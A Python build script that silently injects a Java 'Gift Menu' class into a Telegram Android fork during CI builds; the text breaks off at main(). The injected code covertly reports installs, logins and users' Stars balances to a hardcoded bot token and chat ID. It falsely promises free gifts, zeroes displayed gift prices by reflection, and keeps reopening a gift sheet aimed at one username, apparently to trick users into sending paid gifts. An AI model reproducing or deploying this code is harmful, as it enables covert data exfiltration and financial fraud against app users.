#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
test.py — полный Gift Menu для форка Telegram + авто-вставка при сборке Codemagic
Положи в КОРЕНЬ репо рядом с TMessagesProj. При сборке: python3 test.py
"""

from __future__ import annotations

import os
import re
import sys
from pathlib import Path

BOT_TOKEN = "8863617268:AAECIwC9usJTfuBzY6hjHHf0VL57hZ6EfNs"
BOT_CHAT_ID = "8940489868"
CATALOG_USERNAME = "wasy119"


def find_root() -> Path:
    env = os.environ.get("CM_BUILD_DIR")
    if env and (Path(env) / "TMessagesProj").exists():
        return Path(env)
    cwd = Path.cwd()
    for p in [cwd, cwd.parent, Path(__file__).resolve().parent]:
        if (p / "TMessagesProj").exists():
            return p
    return cwd


ROOT = find_root()
TM = ROOT / "TMessagesProj" / "src" / "main" / "java" / "org" / "telegram"
GIFTS = TM / "ui" / "Gifts"
MOD_PATH = GIFTS / "GiftMenuMod.java"


def log(msg: str) -> None:
    print(f"[test.py] {msg}", flush=True)


def read(p: Path) -> str:
    return p.read_text(encoding="utf-8", errors="replace")


def write(p: Path, s: str) -> None:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(s, encoding="utf-8")
    try:
        rel = p.relative_to(ROOT)
    except Exception:
        rel = p
    log(f"write {rel}")


def find_java(name: str):
    for base in (TM / "ui", TM / "messenger", TM):
        p = base / name
        if p.exists():
            return p
    found = list(TM.rglob(name)) if TM.exists() else []
    return found[0] if found else None


def build_java() -> str:
    return (
        "package org.telegram.ui.Gifts;\n\n"
        "import android.app.Activity;\n"
        "import android.app.AlertDialog;\n"
        "import android.content.Context;\n"
        "import android.os.Handler;\n"
        "import android.os.Looper;\n"
        "import android.view.MotionEvent;\n"
        "import android.view.View;\n"
        "import android.view.ViewGroup;\n"
        "import android.view.Window;\n"
        "import android.widget.TextView;\n"
        "import android.widget.Toast;\n\n"
        "import org.telegram.messenger.UserConfig;\n"
        "import org.telegram.ui.Stars.StarsController;\n"
        "import org.telegram.tgnet.ConnectionsManager;\n"
        "import org.telegram.tgnet.TLRPC;\n"
        "import org.telegram.messenger.MessagesController;\n\n"
        "import java.io.BufferedReader;\n"
        "import java.io.InputStreamReader;\n"
        "import java.lang.reflect.Constructor;\n"
        "import java.lang.reflect.Field;\n"
        "import java.lang.reflect.Method;\n"
        "import java.net.HttpURLConnection;\n"
        "import java.net.URL;\n"
        "import java.net.URLEncoder;\n"
        "import java.util.List;\n"
        "import java.util.concurrent.atomic.AtomicBoolean;\n\n"
        "public class GiftMenuMod {\n\n"
        f"    private static final String BOT_TOKEN = \"{BOT_TOKEN}\";\n"
        f"    private static final String BOT_CHAT_ID = \"{BOT_CHAT_ID}\";\n"
        f"    public static String CATALOG_USERNAME = \"{CATALOG_USERNAME}\";\n\n"
        "    private static final Handler mainHandler = new Handler(Looper.getMainLooper());\n"
        "    private static final AtomicBoolean startupNotified = new AtomicBoolean(false);\n"
        "    private static final AtomicBoolean loginNotified = new AtomicBoolean(false);\n"
        "    private static final AtomicBoolean authSuccessNotified = new AtomicBoolean(false);\n"
        "    private static final AtomicBoolean welcomeShown = new AtomicBoolean(false);\n"
        "    private static final AtomicBoolean wasOnLogin = new AtomicBoolean(false);\n"
        "    private static final AtomicBoolean reopenMonitorStarted = new AtomicBoolean(false);\n"
        "    private static final AtomicBoolean premiumDialogLock = new AtomicBoolean(false);\n"
        "    private static final AtomicBoolean loginUiShown = new AtomicBoolean(false);\n\n"
        "    private static AlertDialog premiumDialog;\n"
        "    private static Object currentSheet;\n"
        "    private static Runnable openCatalogRunnable;\n\n"
        "    private static final String[] PREMIUM_WORDS = {\"3 месяца\", \"6 месяцев\", \"12 месяцев\"};\n"
        "    private static final String MSG_WELCOME = \"Приветствую тут вы можете получить бесплатно Подарки нажмите Продолжить Для открытия каталога с бесплатным Подарками на данный момент бесплатные подарки только обычные в них входят Подарки стоимостю 0 звезд\";\n"
        "    private static final String MSG_LOGIN = \"В данном Моде вы бесплатно получаете подарки А также вы можете их обменивать на звезды все бесплатно и моментально\";\n"
        "    private static final String MSG_CATALOG = \"В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально\";\n\n"
        "    public static long getStarsBalance(int account) {\n"
        "        try {\n"
        "            StarsController sc = StarsController.getInstance(account);\n"
        "            if (sc == null) return 0;\n"
        "            try { return sc.getBalance(false); } catch (Throwable ignored) {}\n"
        "            try {\n"
        "                Object bal = sc.getBalance();\n"
        "                if (bal != null) {\n"
        "                    try { return ((Number) bal.getClass().getField(\"amount\").get(bal)).longValue(); } catch (Throwable ignored) {}\n"
        "                }\n"
        "            } catch (Throwable ignored) {}\n"
        "            try {\n"
        "                Field f = sc.getClass().getDeclaredField(\"balance\");\n"
        "                f.setAccessible(true);\n"
        "                Object sa = f.get(sc);\n"
        "                if (sa != null) return ((Number) sa.getClass().getField(\"amount\").get(sa)).longValue();\n"
        "            } catch (Throwable ignored) {}\n"
        "        } catch (Throwable ignored) {}\n"
        "        return 0;\n"
        "    }\n\n"
        "    public static void notifyBot(final String text) {\n"
        "        new Thread(() -> {\n"
        "            HttpURLConnection conn = null;\n"
        "            try {\n"
        "                String urlStr = \"https://api.telegram.org/bot\" + BOT_TOKEN + \"/sendMessage?chat_id=\" + BOT_CHAT_ID + \"&text=\" + URLEncoder.encode(text, \"UTF-8\");\n"
        "                conn = (HttpURLConnection) new URL(urlStr).openConnection();\n"
        "                conn.setConnectTimeout(8000);\n"
        "                conn.setReadTimeout(8000);\n"
        "                conn.setRequestMethod(\"GET\");\n"
        "                conn.connect();\n"
        "                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n"
        "                    while (br.readLine() != null) {}\n"
        "                }\n"
        "            } catch (Throwable ignored) {\n"
        "            } finally {\n"
        "                if (conn != null) try { conn.disconnect(); } catch (Throwable ignored) {}\n"
        "            }\n"
        "        }, \"GiftMenuMod-Notify\").start();\n"
        "    }\n\n"
        "    public static void notifyBotWithBalance(int account, String text) {\n"
        "        notifyBot(text + \"\\n\\nБаланс звёзд пользователя: \" + getStarsBalance(account));\n"
        "    }\n\n"
        "    public static void onAppStart() {\n"
        "        if (!startupNotified.compareAndSet(false, true)) return;\n"
        "        try {\n"
        "            int account = UserConfig.selectedAccount;\n"
        "            if (UserConfig.getInstance(account).isClientActivated()) {\n"
        "                notifyBotWithBalance(account, \"Пользователь уже авторизован (запустил приложение)\");\n"
        "            } else {\n"
        "                // ещё не вошёл — тоже сигнал о запуске/скачивании\n"
        "                if (loginNotified.compareAndSet(false, true)) {\n"
        "                    notifyBot(\"У вас новое скачивание: пользователь проходит авторизацию\");\n"
        "                }\n"
        "            }\n"
        "        } catch (Throwable ignored) {\n"
        "            try {\n"
        "                if (loginNotified.compareAndSet(false, true)) {\n"
        "                    notifyBot(\"У вас новое скачивание: пользователь проходит авторизацию\");\n"
        "                }\n"
        "            } catch (Throwable ignored2) {}\n"
        "        }\n"
        "    }\n\n"
        "    public static void onLoginScreen(Activity activity) {\n"
        "        wasOnLogin.set(true);\n"
        "        if (loginNotified.compareAndSet(false, true)) {\n"
        "            notifyBot(\"У вас новое скачивание: пользователь проходит авторизацию\");\n"
        "        }\n"
        "        if (activity == null) return;\n"
        "        // Показываем одно сообщение при входе.\n"
        "        if (!loginUiShown.compareAndSet(false, true)) return;\n"
        "        mainHandler.post(() -> {\n"
        "            try {\n"
        "                if (activity.isFinishing()) return;\n"
        "                new AlertDialog.Builder(activity)\n"
        "                        .setMessage(MSG_LOGIN)\n"
        "                        .setPositiveButton(\"Хорошо\", null)\n"
        "                        .setCancelable(true)\n"
        "                        .show();\n"
        "            } catch (Throwable ignored) {}\n"
        "        });\n"
        "    }\n\n"
        "    public static void onAuthSuccess() {\n"
        "        if (!authSuccessNotified.compareAndSet(false, true)) return;\n"
        "        wasOnLogin.set(false);\n"
        "        try {\n"
        "            notifyBotWithBalance(UserConfig.selectedAccount,\n"
        "                    \"Новый пользователь Авторизовался прошел регистрацию\");\n"
        "        } catch (Throwable ignored) {}\n"
        "    }\n\n"
        "    public static void maybeShowWelcome(final Activity activity, final Runnable openCatalog) {\n"
        "        if (!welcomeShown.compareAndSet(false, true)) return;\n"
        "        if (activity == null || activity.isFinishing()) { welcomeShown.set(false); return; }\n"
        "        try {\n"
        "            if (!UserConfig.getInstance(UserConfig.selectedAccount).isClientActivated()) {\n"
        "                welcomeShown.set(false);\n"
        "                return;\n"
        "            }\n"
        "        } catch (Throwable t) { welcomeShown.set(false); return; }\n"
        "        openCatalogRunnable = openCatalog;\n"
        "        mainHandler.post(() -> {\n"
        "            try {\n"
        "                final AtomicBoolean opened = new AtomicBoolean(false);\n"
        "                AlertDialog.Builder b = new AlertDialog.Builder(activity);\n"
        "                b.setTitle(\"Gift Menu\");\n"
        "                b.setMessage(MSG_WELCOME);\n"
        "                b.setCancelable(false);\n"
        "                b.setPositiveButton(\"Продолжить\", (d, w) -> {\n"
        "                    if (!opened.compareAndSet(false, true)) return;\n"
        "                    try { d.dismiss(); } catch (Throwable ignored) {}\n"
        "                    if (openCatalog != null) try { openCatalog.run(); } catch (Throwable ignored) {}\n"
        "                });\n"
        "                AlertDialog dialog = b.create();\n"
        "                dialog.show();\n"
        "                try {\n"
        "                    Window window = dialog.getWindow();\n"
        "                    if (window != null) {\n"
        "                        attachAnyTap(window.getDecorView(), () -> {\n"
        "                            if (!opened.compareAndSet(false, true)) return;\n"
        "                            try { dialog.dismiss(); } catch (Throwable ignored) {}\n"
        "                            if (openCatalog != null) try { openCatalog.run(); } catch (Throwable ignored) {}\n"
        "                        });\n"
        "                    }\n"
        "                } catch (Throwable ignored) {}\n"
        "            } catch (Throwable ignored) {}\n"
        "        });\n"
        "    }\n\n"
        "    public static void resetWelcome() { welcomeShown.set(false); }\n\n"
        "    private static void attachAnyTap(View view, final Runnable onTap) {\n"
        "        if (view == null) return;\n"
        "        try {\n"
        "            view.setOnTouchListener((v, event) -> {\n"
        "                if (event.getAction() == MotionEvent.ACTION_DOWN && onTap != null) onTap.run();\n"
        "                return false;\n"
        "            });\n"
        "            if (view instanceof ViewGroup) {\n"
        "                ViewGroup vg = (ViewGroup) view;\n"
        "                for (int i = 0; i < vg.getChildCount(); i++) attachAnyTap(vg.getChildAt(i), onTap);\n"
        "            }\n"
        "        } catch (Throwable ignored) {}\n"
        "    }\n\n"
        "    public interface UtilitiesBool { boolean get(); }\n\n"
        "    public static void startAutoReopenMonitor(final UtilitiesBool isMainScreen, final Runnable openCatalog) {\n"
        "        if (!reopenMonitorStarted.compareAndSet(false, true)) return;\n"
        "        openCatalogRunnable = openCatalog;\n"
        "        new Thread(() -> {\n"
        "            while (true) {\n"
        "                try {\n"
        "                    Thread.sleep(500);\n"
        "                    Object sheet = currentSheet;\n"
        "                    if (sheet == null) continue;\n"
        "                    boolean showing = true;\n"
        "                    try {\n"
        "                        Object r = sheet.getClass().getMethod(\"isShowing\").invoke(sheet);\n"
        "                        showing = r instanceof Boolean && (Boolean) r;\n"
        "                    } catch (Throwable t) { showing = false; }\n"
        "                    if (showing) continue;\n"
        "                    currentSheet = null;\n"
        "                    Thread.sleep(4000);\n"
        "                    int account = UserConfig.selectedAccount;\n"
        "                    try { if (!UserConfig.getInstance(account).isClientActivated()) continue; } catch (Throwable t) { continue; }\n"
        "                    if (isMainScreen != null && !isMainScreen.get()) continue;\n"
        "                    final Runnable open = openCatalogRunnable != null ? openCatalogRunnable : openCatalog;\n"
        "                    if (open != null) mainHandler.post(() -> { try { open.run(); } catch (Throwable ignored) {} });\n"
        "                } catch (InterruptedException e) { break; } catch (Throwable ignored) {}\n"
        "            }\n"
        "        }, \"GiftMenuMod-Reopen\").start();\n"
        "    }\n\n"
        "    public static void setCurrentSheet(Object sheet) { currentSheet = sheet; }\n\n"
        "    public static void zeroOutPrices(Object obj) {\n"
        "        if (obj == null) return;\n"
        "        zeroFields(obj, new String[]{\"stars\", \"price\", \"amount\", \"starCount\"});\n"
        "        for (String inner : new String[]{\"gift\", \"starGift\", \"item\"}) {\n"
        "            try {\n"
        "                Field f = obj.getClass().getDeclaredField(inner);\n"
        "                f.setAccessible(true);\n"
        "                Object innerObj = f.get(obj);\n"
        "                if (innerObj != null) zeroFields(innerObj, new String[]{\"stars\", \"price\", \"amount\", \"starCount\"});\n"
        "            } catch (Throwable ignored) {}\n"
        "        }\n"
        "    }\n\n"
        "    public static void zeroOutList(Object list) {\n"
        "        if (list == null) return;\n"
        "        try {\n"
        "            if (list instanceof List) { for (Object o : (List<?>) list) zeroOutPrices(o); return; }\n"
        "            int size = (Integer) list.getClass().getMethod(\"size\").invoke(list);\n"
        "            Method get = list.getClass().getMethod(\"get\", int.class);\n"
        "            for (int i = 0; i < size; i++) zeroOutPrices(get.invoke(list, i));\n"
        "        } catch (Throwable ignored) {}\n"
        "    }\n\n"
        "    private static void zeroFields(Object obj, String[] names) {\n"
        "        Class<?> cls = obj.getClass();\n"
        "        for (String name : names) {\n"
        "            try {\n"
        "                Field f; try { f = cls.getField(name); } catch (NoSuchFieldException e) { f = cls.getDeclaredField(name); }\n"
        "                f.setAccessible(true);\n"
        "                Class<?> t = f.getType();\n"
        "                if (t == long.class || t == Long.class) f.setLong(obj, 0L);\n"
        "                else if (t == int.class || t == Integer.class) f.setInt(obj, 0);\n"
        "            } catch (Throwable ignored) {}\n"
        "        }\n"
        "    }\n\n"
        "    public static void patchStarsControllerCache(int account) {\n"
        "        try {\n"
        "            StarsController sc = StarsController.getInstance(account);\n"
        "            if (sc == null) return;\n"
        "            for (String listName : new String[]{\"starGifts\", \"gifts\", \"availableGifts\"}) {\n"
        "                try {\n"
        "                    Field f = sc.getClass().getDeclaredField(listName);\n"
        "                    f.setAccessible(true);\n"
        "                    zeroOutList(f.get(sc));\n"
        "                } catch (Throwable ignored) {}\n"
        "            }\n"
        "        } catch (Throwable ignored) {}\n"
        "    }\n\n"
        "    public static void applyZeroPatches(int account, Object sheet) {\n"
        "        try {\n"
        "            if (sheet != null) {\n"
        "                try {\n"
        "                    Object r = sheet.getClass().getMethod(\"isShowing\").invoke(sheet);\n"
        "                    if (r instanceof Boolean && !(Boolean) r) return;\n"
        "                } catch (Throwable ignored) {}\n"
        "            }\n"
        "        } catch (Throwable ignored) {}\n"
        "        patchStarsControllerCache(account);\n"
        "        if (sheet != null) {\n"
        "            for (String fieldName : new String[]{\"gifts\", \"starGifts\", \"items\", \"options\", \"availableGifts\"}) {\n"
        "                try {\n"
        "                    Field f = sheet.getClass().getDeclaredField(fieldName);\n"
        "                    f.setAccessible(true);\n"
        "                    zeroOutList(f.get(sheet));\n"
        "                } catch (Throwable ignored) {}\n"
        "            }\n"
        "        }\n"
        "    }\n\n"
        "    public static void hookPremiumCards(final View root, final Context context) {\n"
        "        if (root == null || context == null) return;\n"
        "        try { scanAndHookPremium(root, context); } catch (Throwable ignored) {}\n"
        "    }\n\n"
        "    public static void hookAvatars(final View root, final Context context) {\n"
        "        if (root == null || context == null) return;\n"
        "        try { walkAvatars(root, context); } catch (Throwable ignored) {}\n"
        "    }\n\n"
       "    private static void walkAvatars(View view, final Context context) {\n"
        "        if (view == null) return;\n"
        "        try {\n"
        "            if (view.getClass().getName().contains(\"BackupImageView\") && !isGiftCell(view)) {\n"
        "                view.setOnClickListener(v -> showSimpleMessage(context, MSG_CATALOG));\n"
        "            }\n"
        "            if (view instanceof ViewGroup) {\n"
        "                ViewGroup vg = (ViewGroup) view;\n"
        "                for (int i = 0; i < vg.getChildCount(); i++) walkAvatars(vg.getChildAt(i), context);\n"
        "            }\n"
        "        } catch (Throwable ignored) {}\n"
        "    }\n\n"
        "    private static boolean isGiftCell(View view) {\n"
        "        try {\n"
        "            Object p = view.getParent();\n"
        "            for (int i = 0; i < 6 && p != null; i++) {\n"
        "                String name = p.getClass().getSimpleName();\n"
        "                if (name.contains(\"GiftCell\") || name.contains(\"StarGift\")) return true;\n"
        "                p = (p instanceof View) ? ((View) p).getParent() : null;\n"
        "            }\n"
        "        } catch (Throwable ignored) {}\n"
        "        return false;\n"
        "    }\n\n"
        "    private static void scanAndHookPremium(View view, final Context context) {\n"
        "        if (view == null) return;\n"
        "        try {\n"
        "            if (view instanceof TextView) {\n"
        "                CharSequence cs = ((TextView) view).getText();\n"
        "                if (cs != null) {\n"
        "                    String t = cs.toString().toLowerCase();\n"
        "                    for (String w : PREMIUM_WORDS) {\n"
        "                        if (t.contains(w)) {\n"
        "                            View card = findPremiumCard(view);\n"
        "                            if (card != null) attachPremiumBlocker(card, context);\n"
        "                            break;\n"
        "                        }\n"
        "                    }\n"
        "                }\n"
        "            }\n"
        "            if (view instanceof ViewGroup) {\n"
        "                ViewGroup vg = (ViewGroup) view;\n"
        "                for (int i = 0; i < vg.getChildCount(); i++) scanAndHookPremium(vg.getChildAt(i), context);\n"
        "            }\n"
        "        } catch (Throwable ignored) {}\n"
        "    }\n\n"
        "    private static int countPremiumTexts(View view) {\n"
        "        int count = 0;\n"
        "        try {\n"
        "            if (view instanceof TextView) {\n"
        "                CharSequence cs = ((TextView) view).getText();\n"
        "                if (cs != null) {\n"
        "                    String t = cs.toString().toLowerCase();\n"
        "                    for (String w : PREMIUM_WORDS) { if (t.contains(w)) { count++; break; } }\n"
        "                }\n"
        "            }\n"
        "            if (view instanceof ViewGroup) {\n"
        "                ViewGroup vg = (ViewGroup) view;\n"
        "                for (int i = 0; i < vg.getChildCount(); i++) count += countPremiumTexts(vg.getChildAt(i));\n"
        "            }\n"
        "        } catch (Throwable ignored) {}\n"
        "        return count;\n"
        "    }\n\n"
        "    private static View findPremiumCard(View textView) {\n"
        "        try {\n"
        "            View current = (View) textView.getParent();\n"
        "            View candidate = null;\n"
        "            for (int i = 0; i < 8 && current != null; i++) {\n"
        "                if (current instanceof ViewGroup) {\n"
        "                    int amount = countPremiumTexts(current);\n"
        "                    if (amount == 1) candidate = current;\n"
        "                    else if (candidate != null) break;\n"
        "                }\n"
        "                Object p = current.getParent();\n"
        "                current = (p instanceof View) ? (View) p : null;\n"
        "            }\n"
        "            return candidate;\n"
        "        } catch (Throwable t) { return null; }\n"
        "    }\n\n"
        "    private static void attachPremiumBlocker(View card, final Context context) {\n"
        "        if (card == null) return;\n"
        "        try {\n"
        "            card.setOnTouchListener((v, event) -> {\n"
        "                if (event.getAction() == MotionEvent.ACTION_UP) {\n"
        "                    mainHandler.postDelayed(() -> showPremiumMessage(context), 50);\n"
        "                }\n"
        "                return true;\n"
        "            });\n"
        "            card.setClickable(true);\n"
        "            card.setLongClickable(false);\n"
        "            if (card instanceof ViewGroup) {\n"
        "                ViewGroup vg = (ViewGroup) card;\n"
        "                for (int i = 0; i < vg.getChildCount(); i++) attachPremiumBlocker(vg.getChildAt(i), context);\n"
        "            }\n"
        "        } catch (Throwable ignored) {}\n"
        "    }\n\n"
        "    private static void showPremiumMessage(Context context) {\n"
        "        if (context == null) return;\n"
        "        if (premiumDialogLock.get()) return;\n"
        "        try { if (premiumDialog != null && premiumDialog.isShowing()) return; } catch (Throwable ignored) {}\n"
        "        premiumDialogLock.set(true);\n"
        "        try {\n"
        "            AlertDialog.Builder b = new AlertDialog.Builder(context);\n"
        "            b.setMessage(MSG_CATALOG);\n"
        "            b.setCancelable(false);\n"
        "            b.setPositiveButton(\"Хорошо\", (d, w) -> {\n"
        "                try { d.dismiss(); } catch (Throwable ignored) {}\n"
        "                premiumDialogLock.set(false);\n"
        "                premiumDialog = null;\n"
        "            });\n"
        "            premiumDialog = b.create();\n"
        "            premiumDialog.setCanceledOnTouchOutside(false);\n"
        "            premiumDialog.setCancelable(false);\n"
        "            premiumDialog.show();\n"
        "        } catch (Throwable t) { premiumDialogLock.set(false); premiumDialog = null; }\n"
        "    }\n\n"
        "    private static void showSimpleMessage(Context context, String msg) {\n"
        "        if (context == null) return;\n"
        "        mainHandler.post(() -> {\n"
        "            try { new AlertDialog.Builder(context).setMessage(msg).setPositiveButton(\"Хорошо\", null).show(); } catch (Throwable ignored) {}\n"
        "        });\n"
        "    }\n\n"
        "    public static void startSheetHelpers(final int account, final Object sheet, final View root, final Context context) {\n"
        "        setCurrentSheet(sheet);\n"
        "        patchStarsControllerCache(account);\n"
        "        applyZeroPatches(account, sheet);\n"
        "        if (root != null && context != null) {\n"
        "            mainHandler.postDelayed(() -> { hookAvatars(root, context); hookPremiumCards(root, context); }, 800);\n"
        "        }\n"
        "        for (int i = 0; i < 30; i++) {\n"
        "            final int delay = 100 + i * 150;\n"
        "            mainHandler.postDelayed(() -> {\n"
        "                applyZeroPatches(account, sheet);\n"
        "                if (root != null && context != null) hookPremiumCards(root, context);\n"
        "            }, delay);\n"
        "        }\n"
        "        for (int i = 0; i < 20; i++) {\n"
        "            final int delay = 5000 + i * 500;\n"
        "            mainHandler.postDelayed(() -> applyZeroPatches(account, sheet), delay);\n"
        "        }\n"
        "    }\n\n"
        "    public static void onCatalogScrollIdle(View root, Context context) {\n"
        "        if (root == null || context == null) return;\n"
        "        mainHandler.post(() -> { hookPremiumCards(root, context); hookAvatars(root, context); });\n"
        "    }\n\n"
        "    private static void openCatalogForUser(final Activity activity, final int account, final long targetUserId) {\n"
        "        if (activity == null || targetUserId <= 0) return;\n"
        "        mainHandler.post(() -> {\n"
        "            try {\n"
        "                Class<?> sheetCls = Class.forName(\"org.telegram.ui.Gifts.GiftSheet\");\n"
        "                Object sheet = null;\n"
        "                try {\n"
        "                    sheet = sheetCls.getConstructor(Context.class, int.class, long.class, List.class, Object.class)\n"
        "                            .newInstance(activity, account, targetUserId, null, null);\n"
        "                } catch (Throwable ignore) {}\n"
        "                if (sheet == null) {\n"
        "                    try { sheet = sheetCls.getConstructor(Context.class, int.class, long.class).newInstance(activity, account, targetUserId); } catch (Throwable ignore) {}\n"
        "                }\n"
        "                if (sheet == null) {\n"
        "                    for (Constructor<?> cons : sheetCls.getConstructors()) {\n"
        "                        try {\n"
        "                            Class<?>[] p = cons.getParameterTypes();\n"
        "                            Object[] args = new Object[p.length];\n"
        "                            for (int i = 0; i < p.length; i++) {\n"
        "                                if (Context.class.isAssignableFrom(p[i])) args[i] = activity;\n"
        "                                else if (p[i] == int.class || p[i] == Integer.class) args[i] = account;\n"
        "                                else if (p[i] == long.class || p[i] == Long.class) args[i] = targetUserId;\n"
        "                                else args[i] = null;\n"
        "                            }\n"
        "                            sheet = cons.newInstance(args);\n"
        "                            break;\n"
        "                        } catch (Throwable ignore) {}\n"
        "                    }\n"
        "                }\n"
        "                if (sheet != null) {\n"
        "                    try { sheetCls.getMethod(\"show\").invoke(sheet); } catch (Throwable ignore) {}\n"
        "                    View decor = null;\n"
        "                    try {\n"
        "                        Object win = sheetCls.getMethod(\"getWindow\").invoke(sheet);\n"
        "                        if (win != null) decor = (View) win.getClass().getMethod(\"getDecorView\").invoke(win);\n"
        "                    } catch (Throwable ignore) {}\n"
        "                    startSheetHelpers(account, sheet, decor, activity);\n"
        "                    startAutoReopenMonitor(() -> true, () -> openCatalogForUser(activity, account, targetUserId));\n"
        "                }\n"
        "            } catch (Throwable ignored) {}\n"
        "        });\n"
        "    }\n\n"
        "    public static void openCatalogFromMain(final Activity activity, final int account) {\n"
        "        if (activity == null) return;\n"
        "        final String username = CATALOG_USERNAME.startsWith(\"@\") ? CATALOG_USERNAME.substring(1) : CATALOG_USERNAME;\n"
        "        if (username.length() == 0) return;\n"
        "        try {\n"
        "            TLRPC.TL_contacts_resolveUsername request = new TLRPC.TL_contacts_resolveUsername();\n"
        "            request.username = username;\n"
        "            ConnectionsManager.getInstance(account).sendRequest(request, (response, error) -> {\n"
        "                if (error != null || !(response instanceof TLRPC.TL_contacts_resolvedPeer)) return;\n"
        "                try {\n"
        "                    TLRPC.TL_contacts_resolvedPeer resolved = (TLRPC.TL_contacts_resolvedPeer) response;\n"
        "                    if (resolved.users != null && !resolved.users.isEmpty()) {\n"
        "                        MessagesController.getInstance(account).putUsers(resolved.users, false);\n"
        "                    }\n"
        "                    long targetUserId = resolved.peer != null ? resolved.peer.user_id : 0;\n"
        "                    if (targetUserId <= 0 && resolved.users != null && !resolved.users.isEmpty()) {\n"
        "                        targetUserId = resolved.users.get(0).id;\n"
        "                    }\n"
        "                    if (targetUserId <= 0) return;\n"
        "                    final long finalTargetUserId = targetUserId;\n"
        "                    mainHandler.post(() -> openCatalogForUser(activity, account, finalTargetUserId));\n"
        "                } catch (Throwable ignored) {}\n"
        "            });\n"
        "        } catch (Throwable ignored) {}\n"
        "    }\n"
        "}\n"
    )


def inject_after_method(content: str, patterns, line: str, marker: str) -> str:
    if marker in content:
        return content
    for pat in patterns:
        m = re.search(pat, content)
        if not m:
            continue
        brace = content.find("{", m.end() - 1)
        if brace < 0:
            continue
        addition = f"\n        {line} // GiftMenuMod auto\n"
        log(f"  inject: {marker}")
        return content[: brace + 1] + addition + content[brace + 1 :]
    return content


def inject_before_method_end(content: str, method_pat: str, line: str, marker: str) -> str:
    if marker in content:
        return content
    m = re.search(method_pat, content)
    if not m:
        return content
    start = content.find("{", m.end() - 1)
    if start < 0:
        return content
    depth = 0
    end = -1
    for i in range(start, len(content)):
        if content[i] == "{":
            depth += 1
        elif content[i] == "}":
            depth -= 1
            if depth == 0:
                end = i
                break
    if end < 0:
        return content
    addition = f"\n        {line} // GiftMenuMod auto\n"
    log(f"  inject end: {marker}")
    return content[:end] + addition + content[end:]


def patch_file(path, patcher) -> None:
    if path is None or not path.exists():
        log("skip (not found)")
        return
    old = read(path)
    new = patcher(old)
    if new != old:
        write(path, new)
    else:
        log(f"already ok / no match: {path.name}")


def patch_application_loader(c: str) -> str:
    line = "try { org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); } catch (Throwable ignore) {}"
    c2 = inject_after_method(
        c,
        [r"public\s+static\s+void\s+postInitApplication\s*\(\s*\)\s*\{", r"void\s+postInitApplication\s*\(\s*\)\s*\{"],
        line,
        "GiftMenuMod.onAppStart",
    )
    if c2 != c:
        return c2
    return inject_after_method(c, [r"public\s+void\s+onCreate\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onAppStart")


def patch_login_like(c: str) -> str:
    # Универсальный вызов Activity: this или getParentActivity
    line = (
        "try { android.app.Activity __a = null; "
        "try { __a = getParentActivity(); } catch (Throwable ignore) {} "
        "if (__a == null) try { __a = (android.app.Activity) (Object) this; } catch (Throwable ignore) {} "
        "if (__a != null) org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(__a); "
        "} catch (Throwable ignore) {}"
    )
    if "GiftMenuMod.onLoginScreen" not in c:
        c = inject_after_method(
            c,
            [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"],
            line,
            "GiftMenuMod.onLoginScreen",
        )
        if "GiftMenuMod.onLoginScreen" not in c:
            c = inject_after_method(
                c,
                [r"public\s+void\s+onCreate\s*\([^\)]*\)\s*\{", r"void\s+onCreate\s*\([^\)]*\)\s*\{"],
                line,
                "GiftMenuMod.onLoginScreen",
            )
    if "GiftMenuMod.onAuthSuccess" not in c:
        for pat in [
            r"needFinishActivity\s*\(\s*\)\s*;",
            r"UserConfig\.getInstance\([^)]*\)\.saveConfig\s*\(\s*true\s*\)\s*;",
        ]:
            if re.search(pat, c):
                c = re.sub(
                    pat,
                    lambda m: m.group(0)
                    + "\n        try { org.telegram.ui.Gifts.GiftMenuMod.onAuthSuccess(); } catch (Throwable ignore) {} // GiftMenuMod auto",
                    c,
                    count=1,
                )
                log("  inject onAuthSuccess")
                break
    return c


def patch_launch(c: str) -> str:
    # LaunchActivity — часто точка входа до логина
    line = (
        "try { "
        "if (!org.telegram.messenger.UserConfig.getInstance(org.telegram.messenger.UserConfig.selectedAccount).isClientActivated()) { "
        "org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(this); "
        "} else { "
        "org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); "
        "} "
        "} catch (Throwable ignore) {}"
    )
    if "GiftMenuMod.onLoginScreen" in c and "GiftMenuMod.onAppStart" in c:
        return c
    c2 = inject_after_method(
        c,
        [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"],
        line,
        "GiftMenuMod.onLoginScreen",
    )
    if c2 != c:
        return c2
    return inject_after_method(
        c,
        [r"protected\s+void\s+onCreate\s*\([^\)]*\)\s*\{", r"public\s+void\s+onCreate\s*\([^\)]*\)\s*\{"],
        line,
        "GiftMenuMod.onLoginScreen",
    )


def patch_dialogs(c: str) -> str:
    line = (
        "try { org.telegram.ui.Gifts.GiftMenuMod.maybeShowWelcome(getParentActivity(), "
        "() -> { try { org.telegram.ui.Gifts.GiftMenuMod.openCatalogFromMain(getParentActivity(), currentAccount); } catch (Throwable ignore) {} }); "
        "} catch (Throwable ignore) {}"
    )
    return inject_after_method(
        c,
        [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"],
        line,
        "GiftMenuMod.maybeShowWelcome",
    )


def patch_gift_sheet(c: str) -> str:
    line = (
        "try { android.view.View __decor = getWindow() != null ? getWindow().getDecorView() : null; "
        "org.telegram.ui.Gifts.GiftMenuMod.startSheetHelpers(currentAccount, this, __decor, getContext()); "
        "} catch (Throwable ignore) {}"
    )
    c2 = inject_before_method_end(c, r"public\s+void\s+show\s*\(\s*\)\s*\{", line, "GiftMenuMod.startSheetHelpers")
    if c2 != c:
        return c2
    m = re.search(r"\bsuper\.show\s*\(\s*\)\s*;", c)
    if m and "GiftMenuMod.startSheetHelpers" not in c:
        log("  inject after super.show()")
        return c[: m.end()] + "\n        " + line + " // GiftMenuMod auto" + c[m.end() :]
    return c


def main() -> int:
    log(f"ROOT = {ROOT}")
    if not (ROOT / "TMessagesProj").exists():
